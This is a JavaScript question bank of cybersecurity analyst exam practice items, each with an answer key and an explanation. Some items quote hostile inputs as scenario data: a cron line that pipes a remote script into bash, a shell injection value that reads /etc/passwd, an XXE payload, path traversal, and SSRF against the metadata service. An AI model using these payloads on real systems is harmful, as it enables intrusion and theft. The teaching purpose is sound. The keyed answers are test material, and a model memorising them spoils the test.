// Built-in question bank. Fields: id (stable, unique), d (domain key), q (question), o (exactly 4 options),
// a (0-based index of the correct option; options are shuffled at display time), x (explanation).
window.CYSA = window.CYSA || {};
window.CYSA.questions = [
  { id: "so1", d: "so", q: "EDR alerts show winword.exe spawning powershell.exe with the -EncodedCommand flag on a user's workstation. What is the most likely explanation?", o: ["A macro in a document launched an obfuscated PowerShell payload", "Windows Update is running a scheduled maintenance script", "The user opened PowerShell help from inside Word", "An administrator pushed a signed Group Policy script"], a: 0, x: "Office applications should rarely spawn shells. A Base64-encoded command launched by Word is a classic sign of a malicious macro (ATT&CK T1059.001 under Execution)." },
  { id: "so2", d: "so", q: "Which protocol is designed to transport threat intelligence expressed in STIX between producers and consumers?", o: ["TAXII", "SAML", "OpenIOC", "Syslog"], a: 0, x: "STIX is the language for describing threat intel. TAXII is the transport protocol (HTTPS-based) that shares it. OpenIOC is a separate format, and SAML is for federated authentication." },
  { id: "so3", d: "so", q: "NetFlow shows a host connecting to the same external IP every 60 seconds, ±2 seconds, with small, uniform payloads. What does this pattern most likely indicate?", o: ["Command-and-control beaconing", "A port scan", "Data exfiltration over DNS", "Normal NTP synchronization"], a: 0, x: "Regular intervals with low jitter and small, consistent payloads to one destination are typical of C2 beaconing. Exfiltration usually shows large outbound volume, and NTP goes to known time servers on UDP 123." },
  { id: "so4", d: "so", q: "A DNS log shows thousands of queries such as 4a6f686e.x91k2.example.net, all to one domain, each with a different long random-looking subdomain. What is the most likely activity?", o: ["DNS tunneling or exfiltration", "DNS cache poisoning", "A DNS amplification DDoS", "Fast-flux hosting"], a: 0, x: "Data encoded into subdomain labels (hex or Base32) and sent to one authoritative domain is DNS tunneling. High entropy and a large number of unique subdomains are the giveaway." },
  { id: "so5", d: "so", q: "What is the primary value of a SOAR platform compared with a SIEM alone?", o: ["It automates and orchestrates response actions with playbooks", "It stores logs for longer retention periods", "It replaces the need for endpoint agents", "It performs authenticated vulnerability scans"], a: 0, x: "A SIEM aggregates and correlates events. SOAR adds orchestration and automation, running playbooks that enrich alerts, open tickets and contain threats, which cuts mean time to respond." },
  { id: "so6", d: "so", q: "Which Windows Security event ID records a failed account logon?", o: ["4625", "4624", "4672", "4720"], a: 0, x: "4624 is a successful logon, 4625 is a failed logon, 4672 is special privileges assigned to a new logon, and 4720 is a user account created. A burst of 4625 events points to brute force or password spraying." },
  { id: "so7", d: "so", q: "An email passes SPF but fails DKIM. Which record tells the receiving server how to handle the message and where to send reports?", o: ["DMARC", "MX", "PTR", "DNSSEC"], a: 0, x: "DMARC publishes a policy (none, quarantine or reject) for mail that fails SPF or DKIM alignment, and gives addresses for aggregate and forensic reports." },
  { id: "so8", d: "so", q: "Which statement best describes the core principle of a zero trust architecture?", o: ["Never trust implicitly; verify every request continuously, regardless of network location", "Trust all traffic inside the corporate perimeter firewall", "Authenticate users once at VPN login for the session", "Segment only the DMZ from the internal network"], a: 0, x: "Zero trust drops implicit trust based on network location. Every access request is authenticated, authorized and continuously evaluated by a policy decision point and enforcement point (NIST SP 800-207)." },
  { id: "so9", d: "so", q: "A threat hunter starts from the hypothesis that an adversary is using living-off-the-land binaries. Which data source is most useful to test it?", o: ["Process creation logs with full command lines (e.g. Sysmon Event ID 1)", "Firewall deny logs", "Vulnerability scan results", "Badge access records"], a: 0, x: "LOLBins such as certutil, mshta and rundll32 are legitimate executables, so you hunt for unusual parent-child relationships and arguments. Process creation logs with command lines are the key data." },
  { id: "so10", d: "so", q: "Which tool is best suited to reviewing a full packet capture and reconstructing an HTTP session?", o: ["Wireshark", "Nessus", "Nmap", "John the Ripper"], a: 0, x: "Wireshark analyzes PCAPs and can follow TCP/HTTP streams and export objects. Nessus scans for vulnerabilities, Nmap discovers hosts and ports, and John cracks passwords." },
  { id: "so11", d: "so", q: "While building an incident timeline, an analyst finds that firewall, domain controller and web server logs for the same event are several minutes apart. What should be fixed first?", o: ["Synchronize all log sources to a common NTP time source", "Increase the log retention period", "Switch the logs from syslog to CSV format", "Lower the SIEM's correlation threshold"], a: 0, x: "Correlation depends on accurate, consistent timestamps. Point every device at the same NTP source (and record time zones, ideally UTC) so events from different systems line up." },
  { id: "so12", d: "so", q: "A partner shares a threat report marked TLP:RED. What may the recipient do with it?", o: ["Use it only themselves; it may not be shared further, even within their organization", "Share it with anyone in their organization on a need-to-know basis", "Share it within their community, such as an ISAC", "Publish it freely"], a: 0, x: "Under FIRST's Traffic Light Protocol, RED is for the named recipients only. AMBER allows limited sharing within the organization (and its clients), GREEN within the community, and CLEAR has no limits." },
  { id: "so13", d: "so", q: "An intrusion went unnoticed for 14 months, used custom malware and zero-day exploits, and focused on stealing defense research rather than money. Which threat actor type is most likely?", o: ["Nation-state (APT)", "Hacktivist", "Script kiddie", "Organized crime"], a: 0, x: "Long dwell time, heavy investment in custom tools and zero-days, and an espionage goal point to a nation-state APT. Organized crime is usually after money, and hacktivists want visibility for a cause." },
  { id: "so14", d: "so", q: "An analyst wants to find the server that actually originated a suspicious email. Which header should they examine?", o: ["The bottom-most Received header, since each mail server adds its line at the top", "The From header", "The topmost Received header", "The Subject header"], a: 0, x: "Each hop prepends a Received header, so they read in reverse order and the lowest one is closest to the sender. The From header is set by the sender and is easily forged." },
  { id: "so15", d: "so", q: "A user reports an unexpected invoice attachment that no antivirus engine flags. How can the analyst safely learn what it does?", o: ["Detonate it in an isolated sandbox and observe its behavior", "Open it on the analyst's own workstation", "Forward it to all staff as a warning sample", "Delete it and close the ticket"], a: 0, x: "A sandbox runs the file in an instrumented, isolated environment and records processes, file and registry changes and network calls. That catches new malware that signature-based tools miss." },
  { id: "so16", d: "so", q: "DHCP logs show an unknown MAC address getting an IP on the finance VLAN, and the device isn't in the asset inventory. Which control would most directly prevent this?", o: ["Network access control using 802.1X port authentication", "A host-based firewall on finance PCs", "Full-disk encryption", "A DNS sinkhole"], a: 0, x: "802.1X-based NAC requires a device to authenticate before the switch port grants network access, so rogue devices can't join. The other controls don't stop a device from connecting." },
  { id: "so17", d: "so", q: "Several cloud VMs suddenly run at 100% CPU. An unfamiliar process holds outbound connections to TCP port 3333 on an external host. What is the most likely cause?", o: ["Cryptojacking (unauthorized cryptocurrency mining)", "A failing hard drive", "A routine OS update", "A DNS amplification attack against the VMs"], a: 0, x: "Sustained high CPU from an unknown process talking to a mining pool (ports such as 3333 are common for the Stratum mining protocol) is classic cryptojacking (ATT&CK T1496 Resource Hijacking)." },
  { id: "so18", d: "so", q: "A new value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run launches an unsigned executable from the user's AppData folder. What is this most likely?", o: ["A persistence mechanism that starts malware at each logon", "A normal Windows Update component", "Evidence of data exfiltration", "A privilege escalation exploit"], a: 0, x: "Run keys start programs whenever the user logs on. Malware uses them to survive reboots (ATT&CK T1547.001, Registry Run Keys / Startup Folder). Unsigned binaries in AppData make it more suspicious." },
  { id: "so19", d: "so", q: "At 02:14 a server logs event 4720, and a minute later event 4732 adds the same account to the local Administrators group. No change ticket exists. What does this most likely indicate?", o: ["An attacker creating a privileged account for persistence", "A failed logon attempt", "A user changing their own password", "A scheduled backup job"], a: 0, x: "4720 is a user account created and 4732 is a member added to a security-enabled local group. An unplanned off-hours admin account is a common persistence move (ATT&CK T1136 Create Account)." },
  { id: "so20", d: "so", q: "Which Windows event ID indicates the Security event log was cleared?", o: ["1102", "4688", "7045", "4624"], a: 0, x: "1102 records that the Security audit log was cleared, a common anti-forensics step (ATT&CK T1070.001). 4688 is process creation, 7045 is a new service installed, and 4624 is a successful logon." },
  { id: "so21", d: "so", q: "On a Linux web server, /etc/crontab has a new line that runs curl -s http://203.0.113.50/u.sh | bash every five minutes. What is this?", o: ["Persistence via a scheduled job that re-downloads attacker code", "Normal package manager update behavior", "Log rotation", "An NTP time sync job"], a: 0, x: "Piping a remote script straight into a shell on a schedule gives the attacker repeated code execution even after cleanup (ATT&CK T1053.003, Scheduled Task/Job: Cron). Legitimate updates use the package manager." },
  { id: "so22", d: "so", q: "Which regular expression would best extract IPv4 addresses from a log file?", o: ["\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b", "^[0-9a-f]{64}$", "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}", "\\d{3}-\\d{2}-\\d{4}"], a: 0, x: "Four groups of 1-3 digits separated by dots matches the IPv4 dotted-quad pattern. The others match a SHA-256 hash, an email address and a US Social Security number." },
  { id: "so23", d: "so", q: "Security wants visibility into which SaaS applications employees use and to block uploads of sensitive files to unsanctioned ones. Which tool fits best?", o: ["A cloud access security broker (CASB)", "A network-based IDS", "A vulnerability scanner", "A SIEM with only on-premises log sources"], a: 0, x: "A CASB sits between users and cloud services to discover shadow IT, enforce data loss prevention and apply access policy. On-premises tools see little of direct-to-cloud traffic." },
  { id: "so24", d: "so", q: "An organization wants administrators to check out vaulted credentials for a limited time, with every privileged session recorded. Which solution provides this?", o: ["Privileged access management (PAM)", "Single sign-on (SSO)", "Network access control (NAC)", "Data loss prevention (DLP)"], a: 0, x: "PAM vaults privileged credentials, grants just-in-time access, rotates passwords and records sessions. SSO simplifies user logins but doesn't control or audit privileged use." },
  { id: "so25", d: "so", q: "Employees sign in to a partner's SaaS portal with corporate credentials. The corporate identity provider sends the portal a signed XML assertion. Which standard is in use?", o: ["SAML 2.0", "Kerberos", "RADIUS", "LDAP"], a: 0, x: "SAML federates authentication by having the identity provider issue signed XML assertions to the service provider. Kerberos and LDAP mostly work inside one domain, and RADIUS is for network access." },
  { id: "so26", d: "so", q: "Under the shared responsibility model for IaaS, who is responsible for patching the guest operating system on a cloud VM?", o: ["The customer", "The cloud provider", "The hypervisor vendor", "Nobody; IaaS VMs patch themselves"], a: 0, x: "In IaaS the provider secures the physical hosts, network and hypervisor, and the customer secures everything from the guest OS up. In PaaS and SaaS the provider takes on more of the stack." },
  { id: "so27", d: "so", q: "An analyst has only NetFlow records for a suspected exfiltration. Why can't they tell which files were stolen?", o: ["NetFlow records connection metadata such as IPs, ports, bytes and times, not packet payloads", "NetFlow only captures traffic inside the LAN", "NetFlow data is encrypted by default", "NetFlow is deleted after 24 hours by design"], a: 0, x: "Flow data summarizes who talked to whom, when and how much. That's useful to spot exfiltration but can't show content. Seeing the data needs full packet capture or endpoint and file evidence." },
  { id: "so28", d: "so", q: "Which observation is the strongest network indicator of possible data exfiltration?", o: ["A database server sending gigabytes at 03:00 to a cloud storage host it has never contacted", "Many DHCP renewals during the morning login rush", "ARP traffic between hosts on the same subnet", "Inbound HTTPS to the public web server during business hours"], a: 0, x: "Unusual outbound volume to a new destination at an odd hour, from a server that normally doesn't talk to the internet, is a key exfiltration indicator. The other choices are normal traffic." },
  { id: "so29", d: "so", q: "Firewall logs show one external IP probing TCP 445 on every address in 10.20.30.0/24 within a minute. What type of scan is this?", o: ["A horizontal scan (sweep) for a single service across many hosts", "A vertical scan of many ports on one host", "A credentialed vulnerability scan", "A ping of death"], a: 0, x: "Horizontal scans look for one port or service across many hosts, often to find targets for a known exploit such as SMB. Vertical scans probe many ports on a single host." },
  { id: "so30", d: "so", q: "Analysts spend about 15 minutes per phishing alert manually checking URLs and attachments against reputation services. What improvement would cut this most?", o: ["Automate the enrichment with a SOAR playbook that queries the reputation APIs", "Hire more tier-1 analysts", "Turn off phishing alerts", "Have users classify their own reported emails"], a: 0, x: "Repetitive, rule-based enrichment is ideal for automation. A playbook gathers reputation results before an analyst looks, cutting response time and letting people focus on judgment calls." },
  { id: "so31", d: "so", q: "According to the Pyramid of Pain, detecting which type of indicator causes the adversary the most difficulty to evade?", o: ["Tactics, techniques and procedures (TTPs)", "File hash values", "IP addresses", "Domain names"], a: 0, x: "Hashes, IPs and domains are trivial to change. TTPs describe how an adversary operates, so detections built on behavior force them to change their methods, which is expensive." },
  { id: "so32", d: "so", q: "After giving notice, an engineer downloads ten times their usual volume from the code repository and file shares. Which capability is best suited to flag this?", o: ["User and entity behavior analytics (UEBA)", "Signature-based antivirus", "A web application firewall", "A vulnerability scanner"], a: 0, x: "UEBA baselines normal activity for each user and entity and alerts on deviations, such as unusual data access volume. Signature-based tools miss misuse by authorized users." },
  { id: "so33", d: "so", q: "An email with the CEO's display name, sent from a lookalike external domain, urgently asks accounts payable to wire money to a new account and keep it confidential. What is this?", o: ["Business email compromise (BEC)", "A watering hole attack", "Credential stuffing", "Vishing"], a: 0, x: "BEC impersonates an executive or supplier to trick staff into payments, using urgency and secrecy. Verify any payment change through a known, separate channel such as a call-back." },

  // 2.0 Vulnerability Management
  { id: "vm1", d: "vm", q: "In the CVSS v3.1 vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, what does UI:N mean?", o: ["No user interaction is needed for exploitation", "The vulnerability has no user-facing interface", "No integrity impact", "The attack is not network-reachable"], a: 0, x: "UI is the User Interaction metric. UI:N means the attacker needs nobody to click or open anything. Combined with AV:N, AC:L and PR:N, this vector scores 9.8 Critical." },
  { id: "vm2", d: "vm", q: "Why does a credentialed vulnerability scan generally produce more accurate results than a non-credentialed scan?", o: ["It can inspect installed software, patch levels and configuration from inside the host", "It runs faster because it skips port discovery", "It uses exploits to confirm each vulnerability", "It does not generate any network traffic"], a: 0, x: "With credentials, the scanner reads the registry, package lists and config files directly. That cuts false positives from banner guessing and finds local, missing-patch issues an external view can't see." },
  { id: "vm3", d: "vm", q: "A scan reports an Apache HTTP Server vulnerability on a host that only runs Microsoft IIS. How should the finding be classified?", o: ["False positive", "False negative", "True positive", "True negative"], a: 0, x: "The scanner flagged a vulnerability that isn't present, so it's a false positive. Document it, and tune the scan or add an exception so it doesn't keep coming back." },
  { id: "vm4", d: "vm", q: "A legacy ICS controller has a critical vulnerability, and the vendor will not release a patch. What is the most appropriate response?", o: ["Apply compensating controls such as network segmentation and strict access lists", "Accept the risk with no further action", "Run aggressive active scans weekly to monitor it", "Upgrade the firmware with a third-party unofficial build"], a: 0, x: "When you can't patch, a compensating control lowers the risk. Isolating the device in its own segment with tightly filtered access is the standard answer for OT/ICS." },
  { id: "vm5", d: "vm", q: "Which remediation most effectively prevents SQL injection?", o: ["Parameterized queries (prepared statements)", "A web application firewall alone", "Encrypting the database at rest", "Hiding database error messages"], a: 0, x: "Parameterized queries keep user input as data so it can never become SQL. A WAF and suppressed errors help as defense in depth, but they don't fix the flaw." },
  { id: "vm6", d: "vm", q: "A web log shows the request GET /download?file=../../../../etc/passwd. Which attack is being attempted?", o: ["Directory (path) traversal", "Server-side request forgery", "Cross-site request forgery", "LDAP injection"], a: 0, x: "The ../ sequences try to climb out of the web root to read arbitrary files. Defend with canonicalizing paths, an allow-list of file names, and least-privilege file system permissions." },
  { id: "vm7", d: "vm", q: "Why is passive scanning often preferred in OT and ICS environments?", o: ["Active probes can disrupt or crash fragile controllers", "Passive scanning finds more vulnerabilities", "Active scanning is not supported on Windows", "Regulations prohibit all scanning in OT"], a: 0, x: "PLCs and other industrial devices can fault when they get unexpected packets. Passive monitoring identifies assets and vulnerabilities from observed traffic without touching the device." },
  { id: "vm8", d: "vm", q: "Two vulnerabilities both score CVSS 8.1. One appears in CISA's Known Exploited Vulnerabilities (KEV) catalog. How should this affect prioritization?", o: ["Remediate the KEV-listed one first; it is being exploited in the wild", "Treat both equally since the scores match", "Remediate the non-KEV one first because it is less known", "Ignore KEV; only CVSS determines priority"], a: 0, x: "CVSS measures severity, not likelihood. Threat context such as KEV listing or a high EPSS score shows real-world exploitation and should move a vulnerability up the queue." },
  { id: "vm9", d: "vm", q: "An organization purchases cyber insurance to cover breach costs. Which risk response is this?", o: ["Transference", "Avoidance", "Mitigation", "Acceptance"], a: 0, x: "Insurance shifts the financial impact to a third party, which is transference. Avoidance stops the risky activity, mitigation reduces likelihood or impact, and acceptance formally takes on the risk." },
  { id: "vm10", d: "vm", q: "A comment field stores user input that later runs as script in other users' browsers. What type of vulnerability is this?", o: ["Stored (persistent) XSS", "Reflected XSS", "DOM-based XSS", "Clickjacking"], a: 0, x: "Because the payload is saved on the server and served to every visitor, this is stored XSS. Fix it with context-aware output encoding, input validation and a Content Security Policy." },
  { id: "vm11", d: "vm", q: "A web app's preview feature fetches any URL a user supplies. A log shows a request with url=http://169.254.169.254/latest/meta-data/iam/. Which attack is this?", o: ["Server-side request forgery (SSRF) aimed at the cloud metadata service", "Cross-site scripting", "Directory traversal", "DNS rebinding against the user's browser"], a: 0, x: "SSRF makes the server send requests on the attacker's behalf, often to internal-only addresses. 169.254.169.254 is the cloud instance metadata endpoint, which can leak temporary credentials. Fix with allow-lists and by requiring IMDSv2-style session tokens." },
  { id: "vm12", d: "vm", q: "A logged-in banking user visits a malicious page that silently submits a funds-transfer form to the bank, and the browser attaches the user's session cookie. Which defense addresses this directly?", o: ["Anti-CSRF tokens and SameSite cookies", "Output encoding of all user input", "Parameterized database queries", "Disabling directory listing"], a: 0, x: "This is cross-site request forgery: the browser sends a valid session with a forged request. A per-request unpredictable token and SameSite cookie settings stop cross-site requests from being accepted." },
  { id: "vm13", d: "vm", q: "A customer changes /invoice?id=1001 to /invoice?id=1002 in the URL and sees another customer's invoice. What is the vulnerability?", o: ["Insecure direct object reference (broken access control)", "SQL injection", "Session fixation", "Reflected XSS"], a: 0, x: "The app trusts the object ID in the request without checking that the user is authorized for that record. OWASP ranks broken access control as the top web risk. Fix with server-side authorization checks on every object." },
  { id: "vm14", d: "vm", q: "A network diagnostics page passes user input to the system ping command. Submitting 8.8.8.8; cat /etc/passwd returns the passwd file. What is the flaw?", o: ["OS command injection", "LDAP injection", "Cross-site request forgery", "XML external entity injection"], a: 0, x: "The ; ends the ping command and starts a new one, so the input runs as a shell command. Avoid calling the shell with user input, use safe APIs with argument arrays, and validate against an allow-list." },
  { id: "vm15", d: "vm", q: "An uploaded XML file contains <!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]> and the response includes the passwd file. What is the best fix?", o: ["Disable DTD and external entity processing in the XML parser", "Add a CAPTCHA to the upload form", "Enable HTTPS on the upload endpoint", "Increase the upload size limit"], a: 0, x: "This is XML external entity (XXE) injection: the parser resolves an entity that points to a local file. Configure the parser to reject DTDs or external entities, or use a data format that doesn't support them." },
  { id: "vm16", d: "vm", q: "Which operating system protection makes buffer overflow exploits harder by randomizing where code and data are loaded in memory?", o: ["Address space layout randomization (ASLR)", "Data execution prevention (DEP)", "Secure Boot", "Full-disk encryption"], a: 0, x: "ASLR randomizes memory locations so an exploit can't reliably jump to known addresses. DEP is a complementary protection that marks data regions as non-executable." },
  { id: "vm17", d: "vm", q: "A Java application rebuilds objects from serialized data stored in a client-side cookie. A tester modifies the cookie and achieves remote code execution. What is the root cause?", o: ["Insecure deserialization of untrusted data", "Weak password hashing", "A missing Content Security Policy", "Clickjacking"], a: 0, x: "Deserializing attacker-controlled data can trigger dangerous code paths (gadget chains). Don't deserialize untrusted input, or sign and verify it and restrict which classes can be loaded." },
  { id: "vm18", d: "vm", q: "Most of the company's laptops are rarely on the corporate network during scan windows. Which approach gives the most complete vulnerability coverage?", o: ["Agent-based scanning that reports from each endpoint wherever it is", "More frequent network-based scans from the data center", "External scans of the company's public IP range", "Passive scanning on the core switch"], a: 0, x: "Agents run locally and report results whenever the device is online, so remote and roaming endpoints get assessed. Network scans only see hosts that are reachable during the scan window." },
  { id: "vm19", d: "vm", q: "A scan is planned against fragile production systems that have crashed during past scans. Which adjustment reduces the risk of disruption?", o: ["Disable denial-of-service and other dangerous plugins, use safe checks and scan off-hours", "Run the scan with maximum parallel threads to finish faster", "Switch to an exploit framework to confirm findings", "Scan only during peak business hours so issues are noticed quickly"], a: 0, x: "Tuning the scan's sensitivity matters. Excluding intrusive checks, throttling and scheduling for maintenance windows keeps scans from taking down production." },
  { id: "vm20", d: "vm", q: "Which NIST protocol suite uses standardized formats such as XCCDF and OVAL to automate checks of configuration compliance?", o: ["Security Content Automation Protocol (SCAP)", "Structured Threat Information Expression (STIX)", "Simple Network Management Protocol (SNMP)", "Common Weakness Enumeration (CWE)"], a: 0, x: "SCAP combines standards such as XCCDF (checklists), OVAL (system state tests), CPE, CVE and CVSS so tools can check systems against benchmarks consistently. STIX describes threat intel, and CWE catalogs weakness types." },
  { id: "vm21", d: "vm", q: "A team reviews audit logs every week to find unauthorized configuration changes. What type of control is this?", o: ["Detective", "Preventive", "Corrective", "Deterrent"], a: 0, x: "Detective controls find an event after or while it happens. Preventive controls stop it, corrective controls fix the damage, and deterrent controls discourage the attempt." },
  { id: "vm22", d: "vm", q: "How is an acceptable use policy classified among control categories?", o: ["Managerial", "Technical", "Operational", "Physical"], a: 0, x: "Managerial (administrative) controls are policies, risk assessments and governance. Operational controls are carried out by people, such as training or guards. Technical controls are enforced by systems, such as firewalls or MFA." },
  { id: "vm23", d: "vm", q: "Developers want to find injection flaws in their source code before the application is built or deployed. Which testing method fits?", o: ["Static application security testing (SAST)", "Dynamic application security testing (DAST)", "A penetration test of production", "An external network vulnerability scan"], a: 0, x: "SAST analyzes source or bytecode without running it, so it fits early in the SDLC and points to exact lines. DAST tests the running application from the outside." },
  { id: "vm24", d: "vm", q: "A tester feeds a file parser millions of malformed and random inputs and monitors it for crashes and hangs. What technique is this?", o: ["Fuzzing", "Code signing", "Reverse engineering", "Static analysis"], a: 0, x: "Fuzzing generates unexpected input automatically to trigger crashes that reveal memory-safety and input-handling bugs. Each crash is then triaged for exploitability." },
  { id: "vm25", d: "vm", q: "A critical vulnerability can't be patched for six months because the vendor hasn't certified the fix. How should this be handled formally?", o: ["Document a risk exception with compensating controls, an expiry date and approval from the risk owner", "Mark the finding as a false positive", "Delete the finding from the scanner", "Leave it open with no further documentation"], a: 0, x: "An exception records the business justification, compensating controls, a review or expiry date and who accepted the risk. It keeps the risk visible instead of hiding it." },
  { id: "vm26", d: "vm", q: "What does the Exploit Prediction Scoring System (EPSS) from FIRST estimate?", o: ["The probability that a vulnerability will be exploited in the wild in the next 30 days", "The technical severity of a vulnerability", "The financial cost of a breach", "How long a vendor will take to release a patch"], a: 0, x: "EPSS is a data-driven probability (0 to 1) of exploitation activity in the next 30 days. It complements CVSS, which measures severity, not likelihood." },
  { id: "vm27", d: "vm", q: "A Bluetooth stack flaw can only be exploited by an attacker within radio range of the device. What is the CVSS v3.1 Attack Vector?", o: ["Adjacent (AV:A)", "Network (AV:N)", "Local (AV:L)", "Physical (AV:P)"], a: 0, x: "Adjacent means the attack must come from a shared physical or logical network, such as the same subnet, Bluetooth or local Wi-Fi. Network means routable over the internet, and Physical needs hands-on access." },
  { id: "vm28", d: "vm", q: "An attack surface review finds a cloud storage bucket of database backups that anyone on the internet can read. What is the best immediate remediation?", o: ["Block public access and apply a least-privilege bucket policy, then investigate access logs", "Rename the bucket to something hard to guess", "Encrypt only new backups going forward", "Move the backups to another public bucket"], a: 0, x: "Remove public access right away and restrict it to the identities that need it. Then check the access logs to see whether the data was already downloaded, which may trigger incident response." },
  { id: "vm29", d: "vm", q: "A company keeps finding forgotten marketing subdomains and test servers exposed to the internet. Which practice addresses this continuously?", o: ["External attack surface management (EASM)", "An annual penetration test", "Credentialed internal vulnerability scans", "Static code analysis"], a: 0, x: "EASM continuously discovers internet-facing assets, including unknown ones, through DNS, certificates and scanning, then monitors them for exposure. Point-in-time tests miss assets that appear between tests." },
  { id: "vm30", d: "vm", q: "Two simultaneous requests successfully redeem the same single-use gift card twice. What is the vulnerability?", o: ["A race condition (time-of-check to time-of-use)", "Cross-site scripting", "A buffer overflow", "Insecure direct object reference"], a: 0, x: "Both requests passed the 'unused' check before either marked the card as used. Fix with atomic operations, locking or database transactions so the check and update happen as one step." },

  // 3.0 Incident Response and Management
  { id: "ir1", d: "ir", q: "In the NIST SP 800-61 incident response lifecycle, which phase includes the lessons-learned meeting?", o: ["Post-incident activity", "Preparation", "Detection and analysis", "Containment, eradication and recovery"], a: 0, x: "The lifecycle runs Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity. Lessons learned happen in the last phase and feed back into Preparation." },
  { id: "ir2", d: "ir", q: "Following the order of volatility, which should be collected first from a live compromised host?", o: ["System memory (RAM)", "Local disk image", "Remote syslog server entries", "Archived backup tapes"], a: 0, x: "Collect the most volatile data first: CPU registers and cache, then RAM, network state and running processes, then disk, then remote logs, then archival media. RAM is lost on power-off." },
  { id: "ir3", d: "ir", q: "Ransomware is actively encrypting file shares from several workstations. What should the analyst do first?", o: ["Isolate the affected hosts from the network", "Reimage all workstations immediately", "Notify the media", "Run a full vulnerability scan"], a: 0, x: "Containment comes first to stop the spread. Isolate the hosts, ideally with EDR network containment, and keep them powered on to preserve memory evidence. Eradication and reimaging come later." },
  { id: "ir4", d: "ir", q: "In the Lockheed Martin Cyber Kill Chain, an attacker emailing a weaponized PDF to employees is which stage?", o: ["Delivery", "Weaponization", "Exploitation", "Installation"], a: 0, x: "Weaponization is building the malicious PDF. Delivery is sending it, here by email. Exploitation happens when the PDF triggers the flaw on the victim's machine." },
  { id: "ir5", d: "ir", q: "What are the four core features of the Diamond Model of Intrusion Analysis?", o: ["Adversary, capability, infrastructure, victim", "Identify, protect, detect, respond", "Reconnaissance, weaponization, delivery, exploitation", "Tactics, techniques, procedures, indicators"], a: 0, x: "Each Diamond Model event links an adversary who uses a capability over infrastructure against a victim. Pivoting across those edges helps you find related activity." },
  { id: "ir6", d: "ir", q: "Why does a forensic analyst calculate a SHA-256 hash of a disk image at acquisition?", o: ["To verify later that the evidence has not been altered", "To encrypt the evidence for transport", "To compress the image for storage", "To recover deleted files"], a: 0, x: "A matching hash later shows the image is bit-for-bit identical to what was acquired. That proves integrity and supports admissibility, together with chain of custody." },
  { id: "ir7", d: "ir", q: "What is the purpose of a chain-of-custody form?", o: ["Document every person who handled the evidence, when and why", "List the indicators of compromise found", "Record the severity rating of the incident", "Authorize the incident response team to act"], a: 0, x: "Chain of custody records each transfer and access of evidence. Gaps can make evidence inadmissible in court." },
  { id: "ir8", d: "ir", q: "In MITRE ATT&CK, what is the difference between a tactic and a technique?", o: ["A tactic is the adversary's goal (why); a technique is how they achieve it", "A tactic is a specific tool; a technique is a malware family", "They are interchangeable terms", "A technique is the goal; a tactic is the method"], a: 0, x: "Tactics such as Initial Access, Persistence and Exfiltration are the adversary's objectives. Techniques such as T1566 Phishing are the means. Sub-techniques add more detail." },
  { id: "ir9", d: "ir", q: "Legal counsel issues a legal hold during an incident. What does this require?", o: ["Preserve all potentially relevant data and suspend normal deletion", "Stop all incident response activity", "Disclose the incident to the public within 72 hours", "Transfer evidence to law enforcement immediately"], a: 0, x: "A legal hold overrides retention and deletion schedules so relevant records, logs and email are preserved for possible litigation." },
  { id: "ir10", d: "ir", q: "Which activity belongs to the eradication step rather than containment?", o: ["Removing malware and persistence mechanisms, then patching the exploited flaw", "Blocking the C2 domain at the firewall", "Disabling the compromised account temporarily", "Moving infected hosts to a quarantine VLAN"], a: 0, x: "Containment limits damage, for example by blocking, isolating or disabling. Eradication removes the threat and its root cause. Recovery restores and monitors systems." },
  { id: "ir11", d: "ir", q: "Which activity belongs to the Preparation phase of incident response?", o: ["Writing playbooks and assembling a forensic jump kit", "Isolating an infected host", "Restoring systems from backup", "Holding a lessons-learned meeting"], a: 0, x: "Preparation builds the capability before an incident: policies, playbooks, contact lists, tools, training and exercises. The other choices belong to later phases." },
  { id: "ir12", d: "ir", q: "An analyst must image a suspect's hard drive for possible court use. What should they connect between the drive and the forensic workstation?", o: ["A hardware write blocker", "A USB hub", "A network tap", "A KVM switch"], a: 0, x: "A write blocker lets the workstation read the drive while blocking any writes, so the original evidence isn't changed. Hash the source and the image to prove they match." },
  { id: "ir13", d: "ir", q: "One workstation is confirmed infected with a backdoor that has a known hash and C2 domain. What should the analyst do next to scope the incident?", o: ["Search EDR, DNS and proxy logs across the environment for the same hash and domain", "Reimage the workstation and close the ticket", "Notify all customers of a breach", "Run a password-cracking tool against the domain"], a: 0, x: "Scoping finds every affected system before containment and eradication, so the attacker isn't left on hosts you missed. Sweep for the known IOCs across endpoints and network logs." },
  { id: "ir14", d: "ir", q: "An attacker uses a tool to read the LSASS process memory on a server to harvest password hashes. Which MITRE ATT&CK tactic does this support?", o: ["Credential Access", "Initial Access", "Exfiltration", "Impact"], a: 0, x: "Dumping LSASS is technique T1003 (OS Credential Dumping), which falls under Credential Access. The stolen credentials then usually enable Lateral Movement." },
  { id: "ir15", d: "ir", q: "In the Cyber Kill Chain, malware that has just been installed reaches out over HTTPS to the attacker's server to await instructions. Which stage is this?", o: ["Command and control", "Delivery", "Weaponization", "Reconnaissance"], a: 0, x: "The stages are Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, and Actions on Objectives. The remote control channel is C2." },
  { id: "ir16", d: "ir", q: "Why should responders usually avoid powering off a compromised host before collecting evidence?", o: ["Volatile data such as memory, running processes and network connections would be lost", "Powering off voids the hardware warranty", "The disk will be automatically encrypted", "Shutting down notifies law enforcement"], a: 0, x: "RAM can hold malware that only lives in memory, encryption keys, injected code and active connections. Isolate the host from the network and capture memory first." },
  { id: "ir17", d: "ir", q: "Before restoring ransomware-hit servers from backup, what should the team confirm?", o: ["The backups predate the compromise and are clean, and the entry point has been closed", "The ransom has been paid", "All logs from the incident have been deleted", "Users have changed their desktop wallpaper"], a: 0, x: "Restoring backups that contain the attacker's persistence, or restoring without fixing the initial access flaw, invites reinfection. Validate the backups, fix the root cause, then restore and monitor closely." },
  { id: "ir18", d: "ir", q: "NIST SP 800-61 suggests prioritizing incidents by which factors?", o: ["Functional impact, information impact and recoverability", "Attacker nationality, motive and budget", "Number of alerts, analysts and tickets", "CVSS score of the exploited flaw only"], a: 0, x: "The guide prioritizes by functional impact on the business, information impact (confidentiality, integrity and privacy of data) and recoverability (the time and resources needed to recover)." },
